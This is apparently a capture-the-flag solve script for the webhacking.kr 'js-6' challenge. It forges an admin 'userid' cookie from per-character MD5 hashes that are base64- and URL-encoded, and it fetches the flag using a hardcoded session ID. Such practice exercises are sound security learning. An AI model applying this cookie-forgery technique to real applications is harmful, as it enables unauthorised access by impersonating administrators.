from bs4 import BeautifulSoup
import hashlib
import base64
import urllib.parse
import requests

URL = "https://webhacking.kr/challenge/js-6"
URI = "/"
PHPSESSID = '2iti1mqblclscqcnp08irp82q2'
MD5_PLAIN_LIST = []

for c in "admin":
    MD5_PLAIN_LIST.append(hashlib.md5(c.encode('utf-8')).hexdigest())

MD5_PLAIN_STR = ''.join(MD5_PLAIN_LIST)

PAYLOAD = urllib.parse.quote(base64.b64encode(MD5_PLAIN_STR.encode('utf-8')).decode('utf-8'))

COOKIES = {
    'PHPSESSID' : PHPSESSID,
    'userid' : PAYLOAD
}

# 풀이
# 1. userid를 "admin"으로 지정하는데, 각 문자를 MD5 해시화한 다음 문자열을 합침
# 2. 합친 문자열을 Base64 인코딩 후 URL 인코딩 재실시하여 쿠키로 userid에 삽입
# 3. 문제 페이지 실행해서 플래그 확득

resp = requests.get(URL + URI , cookies=COOKIES)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)